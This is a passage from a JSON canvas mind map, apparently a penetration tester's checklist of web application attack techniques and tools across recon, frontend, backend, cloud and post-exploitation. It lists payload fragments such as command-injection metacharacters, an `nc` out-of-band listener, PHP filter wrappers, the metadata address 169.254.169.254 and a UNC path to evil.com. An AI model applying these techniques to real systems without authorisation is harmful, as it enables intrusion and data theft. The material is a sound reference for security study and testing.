{
	"nodes":[
		{"type":"group","id":"web_app_architecture_group","x":-2100,"y":0,"width":7600,"height":7000,"color":"1","label":"Modern Web Application Architecture - COMPREHENSIVE ATTACK SURFACE & EXPLOITATION LIFECYCLE"},
		{"type":"group","id":"infra_deployment_group","x":100,"y":2200,"width":3500,"height":4700,"color":"5","label":"Infrastructure & Deployment - Systemic Exploitation & Pivoting"},
		{"type":"group","id":"backend_group","x":1400,"y":100,"width":2200,"height":4950,"color":"3","label":"Backend (Server-Side) - Deep Dive into the Dark Core"},
		{"type":"group","id":"frontend_group","x":100,"y":100,"width":1800,"height":2850,"color":"2","label":"Frontend (Client-Side) - Attack Vectors & DOMination"},
		{"type":"group","id":"data_layer_group","x":3700,"y":100,"width":1800,"height":2800,"color":"4","label":"Data Layer - Exploitation Surface & Exfiltration Tactics"},
		{"type":"group","id":"post_exploitation_group","x":2000,"y":5050,"width":2500,"height":1800,"color":"7","label":"Post-Exploitation & Lateral Movement - Owning the Environment & Achieving Objectives"},
		{"type":"group","id":"recon_initial_access_group","x":-2000,"y":100,"width":1900,"height":1500,"color":"8","label":"Reconnaissance & Initial Access Vector Identification - The Hunt"},
		{"type":"group","id":"interaction_flows_group","x":3700,"y":2000,"width":1800,"height":1500,"color":"6","label":"Interaction Flows (Attack Chain Perspective - Kill Chain View)"},
		{"type":"text","id":"html_css","text":"HTML/CSS - Injection, Dangling Markup, CSS Exfil (attribute selectors, font loading, scroll events)","x":150,"y":150,"width":600,"height":40},
		{"type":"text","id":"js_frameworks","text":"Frameworks/Libraries (Inherent & Supply Chain Vulnerabilities) - Outdated versions (Retire.js), known CVEs, framework-specific XSS/bypass.","x":180,"y":360,"width":700,"height":40},
		{"type":"text","id":"subresource_integrity_bypass","text":"Subresource Integrity (SRI) Bypass - If SRI not implemented or CDN compromised, leading to malicious JS/CSS execution. Look for dynamically generated script tags.","x":180,"y":1630,"width":850,"height":40},
		{"type":"text","id":"app_server","text":"Application Server - Runtime Environment Exploitation & Misconfigurations","x":1450,"y":150,"width":600,"height":40},
		{"type":"text","id":"prog_languages","text":"Programming Languages & Runtimes - Common Pitfalls & Exploitation Techniques","x":1480,"y":200,"width":650,"height":40},
		{"type":"text","id":"arch_styles","text":"Architectural Styles - Attack Surface Implications & Weak Points","x":1480,"y":610,"width":600,"height":40},
		{"type":"text","id":"apis","text":"APIs (Application Programming Interfaces) - Gateway to Backend Mayhem","x":1450,"y":930,"width":600,"height":40},
		{"type":"text","id":"auth_authz","text":"Authentication & Authorization - Critical Bypass Points & Takeover Vectors","x":1450,"y":1190,"width":650,"height":40},
		{"type":"text","id":"auth_mechanisms","text":"Mechanisms - Exploit Focus & Common Breaks","x":1480,"y":1240,"width":500,"height":40},
		{"type":"text","id":"vuln_scanning_automated","text":"Automated Vulnerability Scanning - Nuclei (custom/community templates for specific CVEs & vulns), Nikto, OpenVAS/Nessus (if permitted, often noisy), Burp Suite Active Scan (configured for depth, not speed), ZAP Active Scan. CRITICAL: Correlate findings, verify manually, don't trust output blindly. Understand the 'why' behind a finding.","x":-1950,"y":300,"width":1100,"height":40},
		{"type":"text","id":"source_code_review_recon","text":"Source Code Review (if available/obtainable) - Static Analysis (SAST: Semgrep, SonarQube, CodeQL), Manual review for: hardcoded secrets (API keys, creds), logic flaws (auth/authz bypasses), insecure function usage (strcpy, eval, exec), known vulnerable dependencies (check manifest files like package.json, pom.xml), backdoors, crypto weaknesses.","x":-1950,"y":350,"width":1100,"height":40},
		{"type":"text","id":"cloud_recon","text":"Cloud Recon - Enumerating S3 Buckets/Azure Blobs/GCP Buckets (Grayhat Warfare, S3Scanner, Cloud_Enum), Cloud Service Endpoints (MicroBurst, Enumerate نقطه پایانی های خدمات ابری), IAM User/Role Enumeration (if initial creds known via e.g. SSRF to IMDS), Metadata services (IMDS v1/v2 abuse), Public Snapshots/AMIs, CloudFormation/Terraform template misconfigs from public repos.","x":-1950,"y":400,"width":1150,"height":40},
		{"type":"text","id":"supply_chain_recon","text":"Supply Chain Recon - Identifying third-party components (JS libs, backend deps, OS packages, container base images), CI/CD tools. Researching known vulns (NVD, Vulners). Tools: Dependency-Check, Snyk CLI, Trivy. Look for vulnerable forks or private repos of public projects.","x":-1950,"y":450,"width":1050,"height":40},
		{"type":"text","id":"identifying_entry_points","text":"Identifying Potential Entry Points - Login/Registration/Password Reset (brute-force, logic flaws), File Uploads (web shells), API Endpoints (OWASP API Top 10), SSRF-vulnerable parameters (URL inputs), Injection points (SQLi, NoSQLi, CMDi, SSTI, XXE, LDAPi), Deserialization inputs (cookies, parameters, headers), GraphQL introspection/query abuse.","x":-1950,"y":500,"width":1100,"height":40},
		{"type":"text","id":"hosting_environments","text":"Hosting Environments - Initial Access, Persistence & Control Plane Compromise","x":150,"y":2250,"width":700,"height":40},
		{"type":"text","id":"on_premise","text":"On-Premise Data Centers - Network Segmentation Bypass, Internal Pivoting, Hypervisor Exploitation (VM escape), Physical Access, Exploiting misconfigured AD CS, Outdated hardware/firmware.","x":180,"y":2300,"width":950,"height":40},
		{"type":"text","id":"cloud_providers","text":"Cloud Providers (AWS, Azure, GCP) - IAM Misconfigurations (overly permissive roles/policies, STS abuse), Metadata Service (IMDSv1/v2) Exploitation/SSRF, Cloud API Abuse (unauth access, privesc), Public Snapshots/Volumes/AMIs, Serverless Misconfigs, Container Escapes to host, Cloud Shell compromise. Tools: Pacu, Cloudsploit, ScoutSuite, Prowler.","x":180,"y":2350,"width":1200,"height":40},
		{"type":"text","id":"paas_iaas_saas","text":"PaaS, IaaS, SaaS - Control Plane Compromise (e.g. compromised admin console for PaaS), Default Credentials, Insecure Configurations (Storage, Network), API Gateway Exploitation, Tenant isolation failures.","x":210,"y":2400,"width":1000,"height":40},
		{"type":"text","id":"zero_trust_architecture_bypass_infra","text":"Zero Trust Architecture Bypass - Exploiting trust broker vulns (PDP/PEP), Policy misconfigs, Compromised endpoints in ZTNA, Attacking microsegmentation controllers, Lateral movement via trusted app-to-app comms.","x":180,"y":4320,"width":1150,"height":40},
		{"type":"text","id":"active_recon_infra","text":"Active Recon (Infrastructure) - Port Scanning (Nmap NSEs, Masscan), Service Version Detection (accurate fingerprinting for exploit mapping), Banner Grabbing (Netcat, Telnet), Subdomain Enumeration (Sublist3r, Amass, Assetfinder, Gobuster DNS, Crt.sh scraping), Virtual Host Bruteforcing (ffuf -H 'Host: FUZZ.target.com'), DNS Zone Transfers (dig axfr), WAF Detection & Fingerprinting (WAFW00F, identify specific WAF for bypasses)","x":-1950,"y":200,"width":1100,"height":40},
		{"type":"text","id":"active_recon_app","text":"Active Recon (Application) - Directory/File Bruteforcing (Dirb, Gobuster, Feroxbuster, FFUF with context-specific wordlists), Parameter Mining (Arjun, ParamSpider, Burp Param Miner), API Endpoint Discovery (Kiterunner, OpenAPI specs, Swagger files), Technology Fingerprinting (Wappalyzer, BuiltWith, Retire.js), JavaScript Analysis (LinkFinder, JSParser, manual review for endpoints, secrets, logic), Source Map Hunting & Decompilation","x":-1950,"y":250,"width":1150,"height":40},
		{"type":"text","id":"phishing_spear_phishing","text":"Phishing/Spear Phishing (If in scope for human element) - Targeting developers/admins for credentials, session hijacking via XSS-to-phishing (e.g. BeEF hooks), OAuth consent grant abuse, weaponized documents for C2 callback.","x":-1950,"y":550,"width":1000,"height":40},
		{"type":"text","id":"exploiting_known_vulns_cve","text":"Exploiting Known Vulnerabilities (CVEs) - Targeting unpatched software (web servers, frameworks, libraries, OS, appliances). Tools: Metasploit Framework, Exploit-DB, SearchSploit, PoC scripts from GitHub. Prioritize based on version fingerprinting, exploitability (e.g. RCE > DoS), and impact. Patch diffing for n-day analysis.","x":-1950,"y":600,"width":1100,"height":40},
		{"type":"text","id":"authentication_bruteforce_credential_stuffing","text":"Authentication Brute-Force & Credential Stuffing - Target login endpoints, API auth. Tools: Hydra, Ncrack, Burp Intruder. Password spraying for common passwords. Check for breached credential lists (HaveIBeenPwned). MFA bypass techniques (push fatigue, weak recovery).","x":-1950,"y":650,"width":1100,"height":40},
		{"type":"text","id":"dom_cssom","text":"DOM & CSSOM (Browser Rendering) - DOM Clobbering (overwriting JS vars/functions), UI Redressing","x":180,"y":200,"width":600,"height":40},
		{"type":"text","id":"javascript","text":"JavaScript Ecosystem - The Wild West of Client Code","x":150,"y":260,"width":400,"height":40},
		{"type":"text","id":"js_engines","text":"Engines (V8, SpiderMonkey, JSC) - JIT Bugs, Type Confusion, Use-After-Free (UAF), Prototype Pollution gadget hunting. 0-click RCE potential (n-days/0-days). Fuzzing targets.","x":180,"y":310,"width":700,"height":40},
		{"type":"text","id":"passive_recon","text":"Passive Recon (OSINT) - Google Dorking (GHDB), Shodan/Censys/ZoomEye/Netlas.io, SecurityTrails, GitHub/GitLab (code, secrets via TruffleHog/Gitleaks), Dark Web data dumps, Social Media (employee tech stack mentions), Job Postings (tech stack), WHOIS/ViewDNS, DNSDumpster,crt.sh, Wayback Machine","x":-1950,"y":150,"width":1000,"height":40},
		{"type":"text","id":"clickjacking","text":"Clickjacking - Frame-busting bypass (X-Frame-Options, CSP frame-ancestors bypass), UI Redressing for credential theft or unintended actions. Advanced: Drag-and-drop attacks.","x":180,"y":1230,"width":800,"height":40},
		{"type":"text","id":"client_logic_bypass","text":"Client-side Logic Bypasses - Parameter Tampering, Disabled JS (always test), LocalStorage/Cookie Modification, Hidden Field Manipulation, Exploiting JS-based rate limiting/validation.","x":180,"y":1280,"width":850,"height":40},
		{"type":"text","id":"web_cache_poisoning_desync_client","text":"Web Cache Poisoning/Desync (Client Perspective) - Unkeyed Headers affecting JS/CSS, Cache-control bypass to serve stale/malicious content. Client-side desync via service workers.","x":180,"y":1430,"width":850,"height":40},
		{"type":"text","id":"web_workers_service_workers","text":"Web/Service Workers - XSS persistence, Cache API poisoning (storing malicious responses), Background Sync abuse for exfil, MITM via controlled service worker, Scope control bypasses.","x":180,"y":1480,"width":850,"height":40},
		{"type":"text","id":"http_header_injection_client","text":"Client-Side HTTP Header Injection (via vulnerable JS making Fetch/XHR requests, e.g. CRLF in URL path passed to Fetch).","x":180,"y":1530,"width":800,"height":40},
		{"type":"text","id":"dom_clobbering_advanced","text":"DOM Clobbering - Overwriting global variables/objects (`window.someVar`) to bypass security controls, trigger XSS, or manipulate application logic. Target specific framework internals.","x":180,"y":1580,"width":850,"height":40},
		{"type":"text","id":"asset_management","text":"Asset Management (Images, Fonts, Videos) - XSS via SVG/EXIF metadata, XXE in image parsers (if processed server-side), File Inclusion (if assets served insecurely), Polyglot files (GIFAR).","x":150,"y":820,"width":800,"height":40},
		{"type":"text","id":"browser_apis","text":"Web APIs (Fetch, WebSockets, LocalStorage, IndexedDB, PostMessage, WebRTC) - Data Manipulation, Session Hijacking, MITM via insecure WebSockets (ws://), PostMessage vulns (origin validation bypass, XSS), WebRTC IP leaks, Cache API abuse.","x":150,"y":870,"width":900,"height":40},
		{"type":"text","id":"frontend_security","text":"Security Considerations - Attacker Perspective & Bypass Strategies","x":150,"y":930,"width":500,"height":40},
		{"type":"text","id":"xss","text":"XSS (Reflected, Stored, DOM) - Payloads (polyglots, advanced `document.baseURI`, Mutation XSS, SVG `animate`), Context Analysis (HTML, JS, URL, CSS), WAF Bypass (encoding, HPP, esoteric tags, event handlers, `DOMPurify` bypasses). Tools: BeEF, XSSHunter.","x":180,"y":980,"width":950,"height":40},
		{"type":"text","id":"csrf_frontend","text":"CSRF - Token Bypass (missing/weak validation, predictable tokens), SameSite=None Abuse (requires Secure flag), Login/Logout CSRF, CSRF in API endpoints (especially if session-based).","x":180,"y":1030,"width":800,"height":40},
		{"type":"text","id":"csp","text":"Content Security Policy (CSP) - Bypass Techniques (nonce reuse, `data:`/`blob:` URIs, JSONP endpoints, trusted domains abuse, script gadgets, `report-uri`/`report-to` for exfil, CSP Injection if dynamically generated).","x":180,"y":1080,"width":900,"height":40},
		{"type":"text","id":"sop_cors","text":"Same-Origin Policy & CORS - CORS Misconfigurations (null origin, regex bypass, trusted suffixes, `Access-Control-Allow-Credentials: true` with `Access-Control-Allow-Origin: *`), Pre-flight bypass, Trusting `Access-Control-Allow-Private-Network: true` from public networks.","x":180,"y":1130,"width":950,"height":40},
		{"type":"text","id":"dom_xss","text":"DOM-based XSS - Source/Sink Analysis (manual, tools like DOMinator), JS Function Abuse (`eval`, `innerHTML`, `document.write`, `location.href`, jQuery `.html()`/`.append()`), Exploiting `window.name`, `document.referrer` for XSS.","x":180,"y":1180,"width":900,"height":40},
		{"type":"text","id":"prototype_pollution","text":"Prototype Pollution - Gadget Chains (client-side to XSS, server-side if Node.js backend uses polluted objects), RCE in Node.js apps, XSS in browser via DOM property overrides.","x":180,"y":1330,"width":800,"height":40},
		{"type":"text","id":"oauth_frontend_vulns","text":"OAuth/OIDC Frontend Vulnerabilities - Redirect URI Bypass (open redirect, path traversal), Response Type Abuse (implicit flow to code), CSRF on redirect, State parameter CSRF/injection, Leaked client secrets in JS.","x":180,"y":1380,"width":900,"height":40},
		{"type":"text","id":"node_js","text":"Node.js (Express, NestJS) - Prototype Pollution (RCE), Command Injection (`child_process`), Insecure Deserialization (node-serialize, yml), Path Traversal (fs modules), HTTP Request Smuggling (`Transfer-Encoding` in `http.request`), Async logic flaws (race conditions).","x":1510,"y":250,"width":1000,"height":40},
		{"type":"text","id":"python","text":"Python (Django, Flask, FastAPI) - Pickle/PyYAML Deserialization RCE, Jinja2 SSTI (sandbox escapes), Command Injection (subprocess, os.system), Directory Traversal, Exploiting `eval()` with `__import__`, Flask/Django debug mode exposure (Werkzeug console).","x":1510,"y":300,"width":1050,"height":40},
		{"type":"text","id":"java","text":"Java (Spring Boot, Quarkus, Struts) - RCE (Spring4Shell, Log4Shell, Struts2 OGNL), Deserialization (ysoserial, Apache Commons Collections, Jackson), JNDI Injection (RMI/LDAP/IIOP), SSRF via URL parsing (HttpURLConnection), Expression Language (EL) Injection (JSF).","x":1510,"y":350,"width":1050,"height":40},
		{"type":"text","id":"go","text":"Go (Gin, Echo) - SSRF (net/http, cURL bindings), Template Injection (html/template if context not controlled), Path Traversal (ioutil, filepath.Join with user input), Insecure use of `unsafe` package.","x":1510,"y":400,"width":900,"height":40},
		{"type":"text","id":"ruby","text":"Ruby (Rails, Sinatra) - YAML Deserialization (RCE), SSTI (ERB, Haml, Slim), RCE via command execution (backticks, `system`), Open Redirects, Mass Assignment.","x":1510,"y":450,"width":850,"height":40},
		{"type":"text","id":"php","text":"PHP (Laravel, Symfony, WordPress) - Object Injection (unserialize RCE with gadgets), LFI/RFI (`include`, `require`), Command Injection (system, exec, shell_exec, passthru), Phar Deserialization, Type Juggling, Variable Functions RCE (`$func()`), PSR-7 stream reuse.","x":1510,"y":500,"width":1050,"height":40},
		{"type":"text","id":"dotnet","text":".NET (ASP.NET Core, Blazor) - ViewState Deserialization (ysoserial.net), LFI (Path.Combine), SSRF (HttpClient), Expression Language Injection, Insecure Deserializers (`BinaryFormatter`, `SoapFormatter`, `Json.Net TypeNameHandling.All`).","x":1510,"y":550,"width":1000,"height":40},
		{"type":"text","id":"monolithic","text":"Monolithic - Wider blast radius on RCE, harder to isolate vulns, shared session state abuse, complex internal logic leading to flaws.","x":1510,"y":660,"width":750,"height":40},
		{"type":"text","id":"microservices","text":"Microservices - Increased attack surface (more APIs, inter-service comms), API Gateway vulns (auth bypass, routing flaws), Service Mesh attacks (Istio misconfig, unauthorized service access), Lateral movement via insecure inter-service trust (mTLS bypass, JWT service account abuse).","x":1510,"y":710,"width":1100,"height":40},
		{"type":"text","id":"serverless_faas","text":"Serverless (FaaS - Lambda, Azure Functions) - SSRF (metadata service, internal endpoints), Insecure Function Permissions (over-privileged IAM roles), Event Injection (SQS, S3 triggers), Cold Start attacks (if setup reveals info), Exploiting IAM role misconfigs for privesc to other cloud services.","x":1510,"y":760,"width":1150,"height":40},
		{"type":"text","id":"spa","text":"SPA (React, Angular, Vue) - Client-side Routing Bypass, XSS via unsafe data binding (dangerouslySetInnerHTML, ng-bind-html), Client-Side Template Injection (CSTI), State management vulns (Vuex, Redux).","x":210,"y":410,"width":800,"height":40},
		{"type":"text","id":"ssr_frameworks","text":"SSR/SSG Frameworks (Next.js, Nuxt.js, Remix) - Data Leakage via hydration mismatch, Server-side XSS, SSRF via component rendering, Misconfigured Edge/Lambda@Edge (SSRF/XSS).","x":240,"y":460,"width":800,"height":40},
		{"type":"text","id":"templating_engines_client","text":"Client-Side Templating Engines (Handlebars, EJS) - Client-Side Template Injection (CSTI) if data isn't sanitized before template processing.","x":270,"y":510,"width":700,"height":40},
		{"type":"text","id":"ssg_tools","text":"Static Site Generators (Gatsby, Astro) - Build-time RCE (plugin vulns, unsafe GraphQL queries), Data Exfiltration during build, Misconfigured API calls in static content.","x":240,"y":560,"width":700,"height":40},
		{"type":"text","id":"event_driven","text":"Event-Driven Architecture (Kafka, RabbitMQ) - Event Spoofing/Injection, Consumer Logic Flaws (leading to RCE/DoS), Message Queue Poisoning, Unauthorized topic/queue access, Deserialization vulns in message payloads.","x":1510,"y":810,"width":1050,"height":40},
		{"type":"text","id":"web_servers","text":"Web Servers / Reverse Proxies (Nginx, Apache, IIS, HAProxy, Envoy) - Path Traversal, File Inclusion, Request Smuggling/Desync (CL.TE, TE.CL, TE.TE), Weak Ciphers, Old Versions (known CVEs), Apache mod_rewrite vulns, Nginx alias traversal, Misconfigured .htaccess/.conf files.","x":1480,"y":870,"width":1100,"height":40},
		{"type":"text","id":"session_cookies","text":"Session-based (Cookies) - Session Fixation, Session Hijacking (XSS, MITM, insecure transport), Weak Session IDs (predictable, low entropy), Cookie Tossing, Path/Domain misconfiguration, Missing HttpOnly/Secure flags.","x":1510,"y":1290,"width":1000,"height":40},
		{"type":"text","id":"token_jwt","text":"Token-based (JWT) - Weak Secrets (HS256 brute-force), 'alg': 'none' bypass, Key Id (kid) injection/path traversal/SSRF, JKU/X5U bypass (header injection), Insecure Payload (sensitive data), Token Replay, CBC-MAC confusion, Cross-Service JWT Relay.","x":1510,"y":1340,"width":1100,"height":40},
		{"type":"text","id":"api_keys","text":"API Keys - Hardcoded in client-side code/mobile apps, Exposed via JS/Source Control (GitHub), Rate Limit Bypass, Insecure Transport (HTTP), Insufficient permissions (key provides too much access).","x":1510,"y":1390,"width":1000,"height":40},
		{"type":"text","id":"oauth2","text":"OAuth2 (Grant Types, PKCE) - Redirect URI bypass (open redirect, path traversal, subdomain takeover), Open Redirect, CSRF (state parameter bypass), Scope Misuse, Code Injection, PKCE Downgrade/Bypass, Leaked client secrets.","x":1510,"y":1440,"width":1050,"height":40},
		{"type":"text","id":"restful_apis","text":"RESTful APIs (HTTP Methods, Status Codes) - Broken Access Control (IDOR, BOLA/BFLA), Mass Assignment, Excessive Data Exposure, SQLi/NoSQLi in parameters, Rate Limiting Bypass, Insecure HTTP Methods (OPTIONS, TRACE), Parameter Pollution for WAF bypass/behavior mod.","x":1480,"y":980,"width":1100,"height":40},
		{"type":"text","id":"graphql","text":"GraphQL (SDL, Resolvers, Introspection) - Excessive Data Exposure (introspection on, field suggestions), Insecure Access Control (BOLA at resolver level), Batching Attacks, DoS (query cost manipulation, deep recursion, alias-based DoS), SQLi/NoSQLi in arguments, CSRF against mutations.","x":1480,"y":1030,"width":1100,"height":40},
		{"type":"text","id":"grpc","text":"gRPC (Protocol Buffers) - Lack of granular access control, insecure default values, client-side validation bypass, Server reflection abuse, Unauthenticated endpoints, Replay attacks if not idempotent.","x":1480,"y":1080,"width":950,"height":40},
		{"type":"text","id":"webhook_endpoints","text":"Webhook Endpoints - SSRF (callback URL exploitation), Request Forgery (CSRF if no signature validation), Unauthenticated Execution, Data leakage via verbose responses, Replay attacks.","x":1480,"y":1130,"width":900,"height":40},
		{"type":"text","id":"oidc","text":"OpenID Connect (OIDC) - JWT attacks (as above), Impersonation via ID token manipulation, Nonce Reuse/Bypass, UserInfo endpoint abuse.","x":1510,"y":1490,"width":850,"height":40},
		{"type":"text","id":"saml_sso","text":"SAML / SSO - XML Signature Wrapping (XSW), XML External Entities (XXE), Assertion Tampering (modifying attributes, lifetime), Replay Attacks, SAML signature stripping, Weak XML canonicalization, IdP/SP misconfigurations.","x":1510,"y":1540,"width":1050,"height":40},
		{"type":"text","id":"auth_flows","text":"Flows (Login, Logout, Registration, Password Reset) - Race Conditions, Brute Force (password spraying), Account Enumeration (timing, response differences), MFA Bypass (push fatigue, recovery code flaws), Weak password policies, Insecure password reset token generation/handling.","x":1480,"y":1600,"width":1150,"height":40},
		{"type":"text","id":"backend_auth_security","text":"Security (Rate Limiting, Brute Force Protection, ACLs, RBAC) - Bypass via IP Rotation (proxies, Tor), Headers (X-Forwarded-For spoofing), Parameter Pollution; Privilege Escalation (RBAC misconfig, default roles, horizontal/vertical escalation).","x":1480,"y":1650,"width":1100,"height":40},
		{"type":"text","id":"backend_caching","text":"Caching (In-Memory, Distributed e.g. Redis/Memcached, HTTP) - Cache Poisoning (Request/Response, unkeyed headers), Cache Deception, Stale Data Attacks, SSRF via cache interaction (e.g., Redis protocol injection). Vary header abuse.","x":1450,"y":1710,"width":1050,"height":40},
		{"type":"text","id":"message_queues_backend","text":"Message Queues / Event Buses (Kafka, RabbitMQ, SQS) - Message Spoofing/Injection, Unauthorized Access (unauth producers/consumers), Dead-letter queue exploitation, Deserialization vulns in message payloads, Replaying messages for DoS/logic flaws.","x":1450,"y":1770,"width":1100,"height":40},
		{"type":"text","id":"background_jobs","text":"Background Jobs/Task Queues (Celery, Sidekiq, BullMQ) - RCE via insecure job definitions/arguments (pickled/serialized data), Privilege Escalation from worker contexts (if worker runs as higher priv user), SSRF via job parameters, Logic flaws in job processing.","x":1450,"y":1830,"width":1100,"height":40},
		{"type":"text","id":"input_validation","text":"Input Validation & Sanitization (Injection Prevention) - Character Encoding Bypass (UTF-7, overlong UTF-8), Double Encoding, Null Byte Attacks (%00), Out-of-band detection (for blind vulns), Unicode normalization attacks (NFKC for filter bypass). Context is KEY.","x":1450,"y":1890,"width":1100,"height":40},
		{"type":"text","id":"idor","text":"IDOR (Insecure Direct Object References) - Numeric IDs, UUIDs (if predictable/sequential), Hashed IDs (weak hashing, rainbow tables), GraphQL IDOR (node-level access, global ID relay), Parameter wrapping, Verb tampering (GET to POST).","x":1480,"y":2360,"width":1100,"height":40},
		{"type":"text","id":"broken_access_control_backend","text":"Broken Access Control - Role-based bypass, Parameter Tampering (changing roles/IDs), API Endpoint bypass (unauthenticated admin paths), Default ACLs, Horizontal/Vertical Privilege Escalation, Forced Browse to admin panels/sensitive functions.","x":1480,"y":2410,"width":1150,"height":40},
		{"type":"text","id":"insecure_design","text":"Insecure Design - Trust Boundaries Misplaced, Missing Security Controls (lack of rate limiting, input validation at wrong layer), Lack of Threat Modeling leading to obvious flaws, Hardcoded credentials, Predictable sensitive tokens.","x":1480,"y":2460,"width":1100,"height":40},
		{"type":"text","id":"xml_external_entities","text":"XXE (XML External Entities) - OOB Data Exfiltration (HTTP, FTP, DNS via parameter entities), SSRF, File Disclosure, DoS (Billion Laughs Attack), Blind XXE. Tools: XXExploiter. Using external DTDs.","x":1480,"y":2510,"width":1050,"height":40},
		{"type":"text","id":"nosql_injection","text":"NoSQL Injection - Operator Injection ($where, $ne, $regex, $lookup in MongoDB), Secondary Context Injection, Schema bypass, JavaScript Injection in eval/mapReduce (MongoDB), Blind NoSQLi.","x":1480,"y":2560,"width":1000,"height":40},
		{"type":"text","id":"command_injection","text":"Command Injection - Shell Metacharacters (`, ;, |, &, $(), ||, &&, \n, \r`), Blind vs. OOB (DNS exfil, nc listener), Escaping bypass (quotes, backslashes), WAF bypass using shell builtins (`echo $(whoami)`).","x":1480,"y":2610,"width":1050,"height":40},
		{"type":"text","id":"ldap_injection","text":"LDAP Injection - Authentication Bypass, Information Disclosure (extracting user attributes), Logic Bypass, Blind LDAP Injection. Special characters: `*()&|=!<>~`. ","x":1480,"y":2660,"width":900,"height":40},
		{"type":"text","id":"crlf_injection","text":"CRLF Injection - HTTP Response Splitting (cache poisoning, XSS), Log Injection, Session Hijacking (cookie manipulation via Set-Cookie in split response), HTTP Header Injection.","x":1480,"y":2710,"width":950,"height":40},
		{"type":"text","id":"logging_monitoring","text":"Logging & Monitoring (ELK Stack, APM, SIEM) - Log Injection (CRLF, HTML injection into logs viewed in web UIs), Sensitive Data in Logs (PII, API keys, session tokens), Monitoring Bypass (alert fatigue, query manipulation), Exploiting log shipping agent vulns.","x":1450,"y":1950,"width":1100,"height":40},
		{"type":"text","id":"backend_server_security","text":"Server-Side Security - Core Exploitation Targets & Payloads","x":1450,"y":2010,"width":600,"height":40},
		{"type":"text","id":"ssrf","text":"SSRF (Server-Side Request Forgery) - Protocol Wrappers (gopher://, file://, dict://, jar://, php://, ftp://, sftp://, smb://), URL Schema Abuse, Cloud Metadata Service Exploitation (169.254.169.254 & IPv6 equivalents), DNS Rebinding (time-based, dual A record), Open Redirect Chains, Blind SSRF (timing, OOB detection via DNS/HTTP). Tools: SSRFmap, Gopherus.","x":1480,"y":2060,"width":1200,"height":40},
		{"type":"text","id":"rce","text":"RCE (Remote Code Execution) - Command Injection, Deserialization, SSTI, Web Shell Upload (polyglots, obfuscated), Arbitrary File Upload leading to RCE (e.g. .php, .jsp, .phar), Exploiting environment variables (LD_PRELOAD, NODE_OPTIONS).","x":1480,"y":2110,"width":1100,"height":40},
		{"type":"text","id":"deserialization","text":"Deserialization Vulnerabilities - Gadget Chains (YSoSerial.NET, JavaDeserPayloads, phpggc), Targeting specific libraries (Jackson, SnakeYAML, Fastjson, Apache Commons), Arbitrary Object Creation, RCE, DoS.","x":1480,"y":2160,"width":1050,"height":40},
		{"type":"text","id":"directory_traversal","text":"Directory Traversal (LFI/RFI) - Dot-dot-slash (`../`), Null Bytes (`%00`), Encoding Bypass (double URL, UTF-8), Log File Inclusion (poisoning logs with shellcode), PHP Filters (data://, php://filter/convert.base64-encode/resource=), Windows UNC path bypass (`\\\\evil.com\\share\\file`).","x":1480,"y":2210,"width":1150,"height":40},
		{"type":"text","id":"file_upload_vulns","text":"File Upload Vulnerabilities - Arbitrary File Upload (Web Shells via .php, .asp, .jsp, .phar), Extension Bypass (double extensions, null byte, case sensitivity), MIME Type Bypass, Race conditions (upload then move), Server-side EXIF processing RCE (ImageMagick).","x":1480,"y":2260,"width":1150,"height":40},
		{"type":"text","id":"logic_flaws","text":"Logic Flaws - Business Logic Bypass (price manipulation, coupon abuse, workflow bypass, state machine attacks), TOCTOU (Time-of-Check to Time-of-Use) attacks, Exploiting precision errors in financial calcs, API abuse beyond OWASP Top 10.","x":1480,"y":2310,"width":1100,"height":40},
		{"type":"text","id":"reverse_proxy_web_server_flow","text":"Reverse Proxy / Web Server - Path Traversal, File Inclusion, Request Smuggling, Config Bypass (e.g. Nginx alias traversal), Exploiting outdated server versions (Apache, Nginx, IIS CVEs).","x":3780,"y":2350,"width":1000,"height":40},
		{"type":"text","id":"business_logic_db_api_flow","text":"Business Logic, DB, API Calls - IDOR, Access Control Bypass, SQLi/NoSQLi to DB, SSRF to internal APIs/services, Deserialization from DB/queue, Data Exfiltration via blind channels, Pivoting to other internal systems.","x":3810,"y":2450,"width":1050,"height":40},
		{"type":"text","id":"memory_corruption_backend","text":"Memory Corruption (Buffer Overflows, Use-After-Free, Integer Overflows in C/C++ extensions/native modules/web server components) - RCE, DoS, Info Leak. Fuzzing targets.","x":1480,"y":2960,"width":1050,"height":40},
		{"type":"text","id":"environment_variable_injection","text":"Environment Variable Injection (e.g., `LD_PRELOAD`, `NODE_OPTIONS`, `PYTHONPATH`, CGI script params) - RCE, Behavior Modification, Info Leak. Often chained with other vulns like file uploads or LFI.","x":1480,"y":3010,"width":1050,"height":40},
		{"type":"text","id":"data_leakage_db","text":"Data Leakage - Error Messages (verbose SQL errors), Verbose Debugging output, Stack Traces revealing schema/queries, Backups in webroot, Misconfigured Cloud Storage, Out-of-band channels.","x":3780,"y":1140,"width":950,"height":40},
		{"type":"text","id":"user_request","text":"Attacker Initiates Request (Crafted Malicious Input: SQLi, XSS, RCE payloads, Deserialization strings, SSRF URLs)","x":3750,"y":2050,"width":850,"height":40},
		{"type":"text","id":"cdn_flow","text":"CDN (Cache Hit/Miss) - Cache Poisoning (Request/Response header manipulation), WAF Bypass (direct origin access, CDN IP ranges), Exploiting CDN logic flaws (e.g. edge compute SSRF).","x":3780,"y":2200,"width":950,"height":40},
		{"type":"text","id":"waf_flow","text":"WAF (Web Application Firewall) - Evasion Techniques (encoding, HPP, null bytes, fragmentation, protocol-level abuse, false negatives). Chain WAF bypass with actual payload.","x":3780,"y":2250,"width":950,"height":40},
		{"type":"text","id":"load_balancer_flow","text":"Load Balancer - Request Smuggling/Desync, Header Spoofing (XFF for IP bypass), IP Whitelist Bypass, Exploiting persistence mechanisms for session hijacking to specific backend.","x":3780,"y":2300,"width":950,"height":40},
		{"type":"text","id":"application_server_backend_flow","text":"Application Server (Backend) - Core Exploitation Point (RCE, Injection, Logic Flaws, Deserialization). Initial foothold here is common.","x":3780,"y":2400,"width":900,"height":40},
		{"type":"text","id":"response_flow","text":"Response (Data + HTML/CSS/JS) - Sensitive Data Disclosure (error messages, debug info), Reflected XSS, Server-side XSS (content injected into response template), CRLF for header injection.","x":3780,"y":2500,"width":1000,"height":40},
		{"type":"text","id":"browser_rendering_flow","text":"Browser Rendering - DOM XSS execution, Clickjacking overlay, Client-side Logic Exploitation (e.g. manipulating JS variables post-response), Stealing sensitive info displayed, Keylogging, CSRF token theft for subsequent attacks.","x":3780,"y":2550,"width":1100,"height":40},
		{"type":"text","id":"relational_dbs","text":"Relational Databases (SQL) - Advanced SQLi & Post-Exploitation","x":3780,"y":200,"width":600,"height":40},
